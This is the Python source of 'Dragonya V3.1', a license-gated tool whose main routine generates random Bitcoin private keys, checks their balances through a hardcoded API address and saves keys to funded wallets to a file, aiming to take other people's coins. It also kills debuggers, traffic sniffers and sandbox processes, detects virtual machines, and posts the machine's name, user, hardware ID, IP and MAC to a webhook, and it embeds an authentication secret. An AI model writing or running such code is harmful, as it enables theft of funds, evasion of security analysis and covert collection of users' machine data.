import requests
import os.path
import subprocess
import platform
import colorama
from colorama import Fore
from time import sleep
from datetime import datetime
import sys
import os
import time, psutil, ctypes, wmi
import hashlib
import binascii
from multiprocessing import Queue
import threading
import base58
import uuid, re
import ecdsa
import requests
import colorama
from requests_toolbelt.adapters.fingerprint import FingerprintAdapter
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad    
from uuid import uuid4  # gen random guid
import json as jsond  # json
from urllib.request import Request, urlopen
from colorama import init
from tqdm import tqdm
from pyotp import TOTP
init()

VERSION = 3.1


###############################################SETTINGS###############################################
vmcheck_switch = True #Enabled by default / Check if this file is running on a vm
vtdetect_switch = True #Enabled by default / Info sending through Discord webhook
listcheck_switch = True #Disabled by default / will block all blacklisted virustotal machines
anti_debug_switch = True #Disabled by default / block debugger programs
#If everything is on the program will be "fully protected"!
pass32 = 'YK6EZQ4LYKJMFCIXYOS4FJRGYKTA===='
key = TOTP(pass32).now()
devmode = False #Yeah name says it all
programblacklist = ["httpdebuggerui.exe", "wireshark.exe", "HTTPDebuggerSvc.exe", "fiddler.exe", "regedit.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe","pestudio.exe", "vmwareuser", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
###############################################SETTINGS###############################################

###############################################DEBUG###############################################
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

def miner():
    def autostart():
        time.sleep(1000)
        python = sys.executable
        os.execl(python, python, *sys.argv)

    def generate_private_key():
        return binascii.hexlify(os.urandom(32)).decode('utf-8')

    def private_key_to_WIF(private_key):
        var80 = "80" + str(private_key) 
        var = hashlib.sha256(binascii.unhexlify(hashlib.sha256(binascii.unhexlify(var80)).hexdigest())).hexdigest()
        return str(base58.b58encode(binascii.unhexlify(str(var80) + str(var[0:8]))), 'utf-8')

    def private_key_to_public_key(private_key):
        sign = ecdsa.SigningKey.from_string(binascii.unhexlify(private_key), curve = ecdsa.SECP256k1)
        return ('04' + binascii.hexlify(sign.verifying_key.to_string()).decode('utf-8'))

    def public_key_to_address(public_key):
        alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        count = 0; val = 0
        var = hashlib.new('ripemd160')
        var.update(hashlib.sha256(binascii.unhexlify(public_key.encode())).digest())
        doublehash = hashlib.sha256(hashlib.sha256(binascii.unhexlify(('00' + var.hexdigest()).encode())).digest()).hexdigest()
        address = '00' + var.hexdigest() + doublehash[0:8]
        for char in address:
            if (char != '0'):
                break
            count += 1
        count = count // 2
        n = int(address, 16)
        output = []
        while (n > 0):
            n, remainder = divmod (n, 58)
            output.append(alphabet[remainder])
        while (val < count):
            output.append(alphabet[0])
            val += 1
        return ''.join(output[::-1])

    def get_balance(address):
        #time.sleep(0.2) #This is to avoid over-using the API and keep the program running indefinately.
        try:
            response = requests.get("http://142.93.228.111:3001/api/addr/" + str(address)) #https://sochain.com/api/v2/address/BTC/
            return float(response.json()['balance']) 
        except:
            return -1

    def data_export(queue):
        while True:
            private_key = generate_private_key()
            public_key = private_key_to_public_key(private_key)
            address = public_key_to_address(public_key)
            data = (private_key, address)
            queue.put(data, block = False)

    def worker(queue):
        count = 0
        while True:
            count += 1
            if not queue.empty():
                data = queue.get(block = True)
                balance = get_balance(data[1])
                process(data, balance, count)

    def process(data, balance, count):
        private_key = data[0]
        address = data[1]
        if (balance == 0.00000000):
            os.system(f'title Dragonya V3.1 ┃ Checked: {count}')
            #print("\n[DRAGONYA] : ADDRESS {:<34}".format(str(address)) + f": BALANCE " + str(balance))
            print("\n{}[DRAGONYA] : {}ADDRESS {}{:<34}".format(Fore.MAGENTA,Fore.RED,Fore.WHITE,str(address)) + f": {Fore.RED}BALANCE{Fore.WHITE} " + str(balance))
        if (balance > 0.00000000):
            print("\n{}[DRAGONYA] : {}ADDRESS {}{:<34}".format(Fore.MAGENTA,Fore.RED,Fore.WHITE,str(address)) + f": {Fore.RED}BALANCE{Fore.WHITE} " + str(balance))
            print(f"\n{Fore.MAGENTA}[DRAGONYA] : {Fore.RED}PRIVATE_KEY {Fore.WHITE}{private_key}")
            file = open("found.txt","a")
            file.write("address: " + str(address) + "\n" +
                    "private key: " + str(private_key) + "\n" +
                    "balance: " + str(balance) + "\n\n")
            file.close()

    def thread():
        processes = []
        data = Queue()
        data_factory = threading.Thread(name="data_export",target = data_export, args = (data,))
        data_factory.daemon = True
        processes.append(data_factory)
        data_factory.start()
        work = threading.Thread(name="worker",target = worker, args = (data,))
        work.daemon = True
        processes.append(work)
        work.start()
        data_factory.join()

    try:
        if devmode == True:
            thr = threading.Thread(name='Thread', target=thread)
            print(f"{Fore.GREEN}[DEVMODE]: {Fore.WHITE}Starting thread: {thread} Name: Thread")
            thr.start()
            print(f"{Fore.GREEN}[DEVMODE]: {Fore.WHITE}Started thread:{thread} Name: Thread")
            thr2 = threading.Thread(name='Thread-Restart', target=autostart)
            print(f"{Fore.GREEN}[DEVMODE]: {Fore.WHITE}Starting thread: {autostart} Name: Autostart")
            thr2.start()  
            print(f"{Fore.GREEN}[DEVMODE]: {Fore.WHITE}Started thread: {autostart} Name: Autostart")
        else:
            for i in range(1):
                thr = threading.Thread(name='Thread', target=thread)
                thr.start()
                thr2 = threading.Thread(name='Thread-Restart', target=autostart)
                thr2.start()  
    except Exception as e:
        print(e)


if devmode == True:
    if hwid == '032E02B4-0499-05C3-0806-3C0700080009':
        devmode = True
        loop = tqdm(total= 1000, position=0, leave=False)
        for k in range(250):
            time.sleep(0.01)
            loop.set_description("{}DEVELOPER DETECTED, LOADING DEV MODE! ┃ Loading".format(Fore.GREEN,k))
            loop.update(4)
        loop.close()
        time.sleep(1)
        os.system('cls')
        print(f"{Fore.YELLOW}[WARNING]:{Fore.RESET} This is a debug mode, made {Fore.RED}ONLY{Fore.RESET} for Developers!")
        time.sleep(2)
        print(f'''{Fore.RED}
                            ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗██╗   ██╗ █████╗ 
                            ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║╚██╗ ██╔╝██╔══██╗
                            ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║ ╚████╔╝ ███████║
                            ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║  ╚██╔╝  ██╔══██║
                            ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║   ██║   ██║  ██║
                            ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝    

                            ___  _____   _____ _    ___  ___ ___ ___   __  __  ___  ___  ___ 
                            |   \| __\ \ / / __| |  / _ \| _ \ __| _ \ |  \/  |/ _ \|   \| __|
                            | |) | _| \ V /| _|| |_| (_) |  _/ _||   / | |\/| | (_) | |) | _| 
                            |___/|___| \_/ |___|____\___/|_| |___|_|_\ |_|  |_|\___/|___/|___|
                            
                                                            V{VERSION}
                                                                    
        {Fore.RESET}''')
    else:
        pass
else:
    pass

###############################################DEBUG###############################################

###############################################DATA###############################################
serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_name = str(os_name).replace("'","");os_name = str(os_name).replace("b","")
gpu = computer.Win32_VideoController()[0].Name
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
def getip(): #GET IP
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

ip = getip()
###############################################DATA###############################################

def block_debuggers(dcapi):
    while True:
        time.sleep(1)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in programblacklist):
                try:
                    print("\nBlacklisted program found! Exiting...")
                    requests.post(dcapi, headers={"Authorization": key}, data={"content": f"""```yaml
![Blacklisted Program]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
PLATFORM: {os_name}
Blacklisted Program: {str(proc.name())}
PID: {int(proc.ppid())}
Status: {str(proc.status())}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})
                    proc.kill()
                    os._exit(1) 
                except(psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

def block_dlls(dcapi):
    while True:
        time.sleep(10)
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{dcapi}',json={'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass  

def vtdetect(dcapi):
    requests.post(dcapi, headers={"Authorization": key}, data={"content": f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {gpu}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})

def vmcheck(dcapi):
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True: # if we are in a vm
        requests.post(f'{dcapi}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
        os._exit(1) # exit
    
    else:
        pass

    def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            print("VMware Registry Detected")
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**VMware Registry Detected**"})
            os._exit(1)

    def processes_and_files_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
            os._exit(1)
                        
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**Vmware DLL Detected**"})
            os._exit(1)
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**VirtualBox DLL Detected**"})
            os._exit(1)     

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            print("VMware MAC Address Detected")
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**VMware MAC Address Detected**"})
            os._exit(1)
    registry_check()
    processes_and_files_check()
    mac_check()


def listcheck(dcapi):
    try:
        if hwid in hwidlist.text:
            print('BLACKLISTED HWID DETECTED')
            print(f'HWID: {hwid}') 
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            print('BLACKLISTED PC USER DETECTED!')
            print(f'PC USER: {serveruser}') 
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            print('BLACKLISTED PC NAME DETECTED!')
            print(f'PC NAME: {pc_name}') 
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if ip in iplist.text:
            print('BLACKLISTED IP DETECTED!')
            print(f'IP: {ip}') 
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**Blacklisted IP:** `{ip}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if mac in maclist.text:
            print('BLACKLISTED MAC DETECTED!')
            print(f'MAC: {mac}') 
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**Blacklisted MAC:** `{mac}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if gpu in gpulist.text:        
            print('BLACKLISTED GPU DETECTED!')
            print(f'GPU: {gpu}') 
            requests.post(f'{dcapi}', headers={"Authorization": key},json={'content': f"**Blacklisted GPU:** `{gpu}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)
    

def keyauthload():
    def startall(dcapi):
        if anti_debug_switch == True:
            try:
                if devmode == True:
                    b = threading.Thread(name='Anti-Debug', target=block_debuggers, args=(dcapi,))
                    print(f"{Fore.GREEN}[DEVMODE]: {Fore.WHITE}Starting thread: {block_debuggers} Name: Anti-Debug")
                    b.start()
                    print(f"{Fore.GREEN}[DEVMODE]: {Fore.WHITE}Started thread: {block_debuggers} Name: Anti-Debug")
                    b2 = threading.Thread(name='Anti-DLL', target=block_dlls, args=(dcapi,))
                    print(f"{Fore.GREEN}[DEVMODE]: {Fore.WHITE}Starting thread: {block_dlls} Name: Block DLLs")
                    b2.start()
                    print(f"{Fore.GREEN}[DEVMODE]: {Fore.WHITE}Started thread: {block_dlls} Name: Block DLLs") 
                else:
                    b = threading.Thread(name='Anti-Debug', target=block_debuggers, args=(dcapi,))
                    b.start()
                    b2 = threading.Thread(name='Anti-DLL', target=block_dlls, args=(dcapi,))
                    b2.start()
            except:
                pass
        else:
            pass
        if vtdetect_switch == True:
            vtdetect(dcapi)
        else:
            pass
        if vmcheck_switch == True:
            vmcheck(dcapi)
        else:
            pass
        if listcheck_switch == True:
            listcheck(dcapi)
        else:
            pass
    class api:
        name = ownerid = secret = version = hash_to_check = ""

        def __init__(self, name, ownerid, secret, version, hash_to_check):
            self.name = name

            self.ownerid = ownerid

            self.secret = secret

            self.version = version
            self.hash_to_check = hash_to_check
            self.init()

        sessionid = enckey = ""
        initialized = False

        def init(self):

            if self.sessionid != "":
                print("You've already initialized!")
                time.sleep(2)
                exit(0)
            init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

            self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

            post_data = {
                "type": binascii.hexlify(("init").encode()),
                "ver": encryption.encrypt(self.version, self.secret, init_iv),
                "hash": self.hash_to_check,
                "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
                "name": binascii.hexlify(self.name.encode()),
                "ownerid": binascii.hexlify(self.ownerid.encode()),
                "init_iv": init_iv
            }

            response = self.__do_request(post_data)

            if response == "KeyAuth_Invalid":
                print("The application doesn't exist")
                sys.exit()

            response = encryption.decrypt(response, self.secret, init_iv)
            json = jsond.loads(response)

            if json["message"] == "invalidver":
                if json["download"] != "":
                    print("New Version Available")
                    download_link = json["download"]
                    os.system(f"start {download_link}")
                    sys.exit()
                else:
                    print("Invalid Version, Contact owner to add download link to latest app version")
                    sys.exit()

            if not json["success"]:
                print(json["message"])
                sys.exit()

            self.sessionid = json["sessionid"]
            self.initialized = True
            self.__load_app_data(json["appinfo"])

        def var(self, name):
            self.checkinit()
            init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

            post_data = {
                "type": binascii.hexlify(("var").encode()),
                "varid": encryption.encrypt(name, self.enckey, init_iv),
                "sessionid": binascii.hexlify(self.sessionid.encode()),
                "name": binascii.hexlify(self.name.encode()),
                "ownerid": binascii.hexlify(self.ownerid.encode()),
                "init_iv": init_iv
            }

            response = self.__do_request(post_data)

            response = encryption.decrypt(response, self.enckey, init_iv)

            json = jsond.loads(response)

            if json["success"]:
                return json["message"]
            else:
                print(json["message"])
                time.sleep(5)
                sys.exit()
                
        def register(self, user, password, license, hwid=None):
            self.checkinit()
            if hwid is None:
                hwid = others.get_hwid()

            init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

            post_data = {
                "type": binascii.hexlify(("register").encode()),
                "username": encryption.encrypt(user, self.enckey, init_iv),
                "pass": encryption.encrypt(password, self.enckey, init_iv),
                "key": encryption.encrypt(license, self.enckey, init_iv),
                "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
                "sessionid": binascii.hexlify(self.sessionid.encode()),
                "name": binascii.hexlify(self.name.encode()),
                "ownerid": binascii.hexlify(self.ownerid.encode()),
                "init_iv": init_iv
            }

            response = self.__do_request(post_data)
            response = encryption.decrypt(response, self.enckey, init_iv)
            json = jsond.loads(response)

            if json["success"]:
                startall(keyauthapp.var('HAPI'))
                os.system('cls')
                print("Successfully registered!")
                time.sleep(0.5)
                os.system('cls')
                self.__load_user_data(json["info"])
                print("Logging in...")
                time.sleep(0.5)
                os.system('cls')
                keyauthapp.login(user,password)
                pass
            else:
                print(json["message"])
                sys.exit()

        def login(self, user, password, hwid=None):
            self.checkinit()
            if hwid is None:
                hwid = others.get_hwid()

            init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

            post_data = {
                "type": binascii.hexlify(("login").encode()),
                "username": encryption.encrypt(user, self.enckey, init_iv),
                "pass": encryption.encrypt(password, self.enckey, init_iv),
                "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
                "sessionid": binascii.hexlify(self.sessionid.encode()),
                "name": binascii.hexlify(self.name.encode()),
                "ownerid": binascii.hexlify(self.ownerid.encode()),
                "init_iv": init_iv
            }

            response = self.__do_request(post_data)

            response = encryption.decrypt(response, self.enckey, init_iv)

            json = jsond.loads(response)

            if json["success"]:
                startall(keyauthapp.var('Log'))
                self.__load_user_data(json["info"])
                os.system('cls')
                if jsond.load(open("Files/auth.json"))["authusername"] == "":
                    config = jsond.load(open("Files/auth.json"))
                    config["authusername"] = user
                    jsond.dump(config, open('Files/auth.json', 'w'), sort_keys=False, indent=4)
                    config["authpassword"] = password
                    jsond.dump(config, open('Files/auth.json', 'w'), sort_keys=False, indent=4)
                else:
                    pass
                print("Successfully logged in! Starting program...")
                time.sleep(1)
                os.system('cls')
                miner()
            else:
                print(json["message"])
                sys.exit()

        def check(self):
            self.checkinit()
            init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
            post_data = {
                "type": binascii.hexlify(("check").encode()),
                "sessionid": binascii.hexlify(self.sessionid.encode()),
                "name": binascii.hexlify(self.name.encode()),
                "ownerid": binascii.hexlify(self.ownerid.encode()),
                "init_iv": init_iv
            }
            response = self.__do_request(post_data)

            response = encryption.decrypt(response, self.enckey, init_iv)
            json = jsond.loads(response)
            if json["success"]:
                return True
            else:
                return False

        def checkblacklist(self):
            self.checkinit()
            hwid = others.get_hwid()
            init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
            post_data = {
                "type": binascii.hexlify(("checkblacklist").encode()),
                "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
                "sessionid": binascii.hexlify(self.sessionid.encode()),
                "name": binascii.hexlify(self.name.encode()),
                "ownerid": binascii.hexlify(self.ownerid.encode()),
                "init_iv": init_iv
            }
            response = self.__do_request(post_data)

            response = encryption.decrypt(response, self.enckey, init_iv)
            json = jsond.loads(response)
            if json["success"]:
                return True
            else:
                return False

        def log(self, message):
            self.checkinit()
            init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

            post_data = {
                "type": binascii.hexlify(("log").encode()),
                "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
                "message": encryption.encrypt(message, self.enckey, init_iv),
                "sessionid": binascii.hexlify(self.sessionid.encode()),
                "name": binascii.hexlify(self.name.encode()),
                "ownerid": binascii.hexlify(self.ownerid.encode()),
                "init_iv": init_iv
            }

            self.__do_request(post_data)

        def checkinit(self):
            if not self.initialized:
                print("Initialize first, in order to use the functions")
                sys.exit()

        def __do_request(self, post_data):

            rq_out = requests.post(
                "https://keyauth.win/api/1.0/", data=post_data
            )

            return rq_out.text

        class application_data_class:
            numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""
        # region user_data
        class user_data_class:
            username = ip = hwid = expires = createdate = lastlogin = subscription = ""

        user_data = user_data_class()
        app_data = application_data_class()

        def __load_app_data(self, data):
            self.app_data.numUsers = data["numUsers"]
            self.app_data.numKeys = data["numKeys"]
            self.app_data.app_ver = data["version"]
            self.app_data.customer_panel = data["customerPanelLink"]
            self.app_data.onlineUsers = data["numOnlineUsers"]

        def __load_user_data(self, data):
            self.user_data.username = data["username"]
            self.user_data.ip = data["ip"]
            self.user_data.hwid = data["hwid"]
            self.user_data.expires = data["subscriptions"][0]["expiry"]
            self.user_data.createdate = data["createdate"]
            self.user_data.lastlogin = data["lastlogin"]
            self.user_data.subscription = data["subscriptions"][0]["subscription"]
            self.user_data.subscriptions = data["subscriptions"]



    class others:
        @staticmethod
        def get_hwid():
            if platform.system() != "Windows":
                return subprocess.Popen('hal-get-property --udi /org/freedesktop/Hal/devices/computer --key system.hardware.uuid'.split())

            cmd = subprocess.Popen(
                "wmic useraccount where name='%username%' get sid", stdout=subprocess.PIPE, shell=True)

            (suppost_sid, error) = cmd.communicate()

            suppost_sid = suppost_sid.split(b'\n')[1].strip()

            return suppost_sid.decode()


    class encryption:
        @staticmethod
        def encrypt_string(plain_text, key, iv):
            plain_text = pad(plain_text, 16)

            aes_instance = AES.new(key, AES.MODE_CBC, iv)

            raw_out = aes_instance.encrypt(plain_text)

            return binascii.hexlify(raw_out)

        @staticmethod
        def decrypt_string(cipher_text, key, iv):
            cipher_text = binascii.unhexlify(cipher_text)

            aes_instance = AES.new(key, AES.MODE_CBC, iv)

            cipher_text = aes_instance.decrypt(cipher_text)

            return unpad(cipher_text, 16)

        @staticmethod
        def encrypt(message, enc_key, iv):
            try:
                _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

                _iv = SHA256.new(iv.encode()).hexdigest()[:16]

                return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
            except:
                print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
                sys.exit()

        @staticmethod
        def decrypt(message, enc_key, iv):
            try:
                _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

                _iv = SHA256.new(iv.encode()).hexdigest()[:16]

                return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
            except:
                print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
                sys.exit()

    def getchecksum():
        path = os.path.basename(__file__)
        if not os.path.exists(path):
            path = path[:-2] + "exe"
        md5_hash = hashlib.md5()
        a_file = open(path,"rb")
        content = a_file.read()
        md5_hash.update(content)
        digest = md5_hash.hexdigest()
        return digest

    keyauthapp = api(
        name = "DRAGONYA V3",
        ownerid = "GSK7exUrjQ",
        secret = "bf5bad1f3c60eba3c7ec7ee898c3a9a1e8a154fbef68e3d883d94ddf3ca9460f",
        version = "1.0",
        hash_to_check = getchecksum()
    )
    try:
        if os.path.isfile('Files/auth.json'):
            if jsond.load(open("Files/auth.json"))["authusername"] == "":
                os.system('cls')
                print ("""
1. Login (Registered Users)
2. Register (New Users Only)
                """)
                ans=input("Select Option: ") 
                if ans=="1": 
                    user = input('Provide username: ')
                    password = input('Provide password: ')
                    keyauthapp.login(user,password)
                elif ans=="2":
                    user = input('Provide username: ')
                    password = input('Provide password: ')
                    license = input('Provide License: ')
                    keyauthapp.register(user,password,license) 
                else:
                    print("\nNot Valid Option") 
                    os._exit(1) 
            else:
                try:
                    with open('Files/auth.json', 'r') as f:
                        authfile = jsond.load(f)
                        authuser = authfile.get('authusername')
                        authpass = authfile.get('authpassword')
                        keyauthapp.login(authuser,authpass)
                except Exception as e:
                    print(e)
        else:
            try:
                if os.path.isdir('Files'):
                    f = open("Files/auth.json", "a")
                    f.write("""{
        "authusername": "",
        "authpassword": ""
}""")
                    f.close()
                    os.system('cls')
                    print ("""
1. Login (Registered Users)
2. Register (New Users Only)
                    """)
                    ans=input("Select Option: ") 
                    if ans=="1": 
                        user = input('Provide username: ')
                        password = input('Provide password: ')
                        keyauthapp.login(user,password)
                    elif ans=="2":
                        user = input('Provide username: ')
                        password = input('Provide password: ')
                        license = input('Provide License: ')
                        keyauthapp.register(user,password,license) 
                    else:
                        print("\nNot Valid Option") 
                        os._exit(1) 
                else:
                    os.mkdir('Files')
                    f = open("Files/auth.json", "a")
                    f.write("""{
        "authusername": "",
        "authpassword": ""
}""")
                    f.close()
                    os.system('cls')
                    print ("""
1. Login (Registered Users)
2. Register (New Users Only)
                    """)
                    ans=input("Select Option: ") 
                    if ans=="1": 
                        user = input('Provide username: ')
                        password = input('Provide password: ')
                        keyauthapp.login(user,password)
                    elif ans=="2":
                        user = input('Provide username: ')
                        password = input('Provide password: ')
                        license = input('Provide License: ')
                        keyauthapp.register(user,password,license) 
                    else:
                        print("\nNot Valid Option") 
                        os._exit(1) 
            except Exception as e:
                print(e)
                os._exit(1) 

    except Exception as e:
        print(f"Error while loading auth file... check if the auth file is missing/empty or not ERROR CODE: {e}")
        time.sleep(3)
        os._exit(1)

try:
    keyauthload()
except KeyboardInterrupt:
    os._exit(1)     
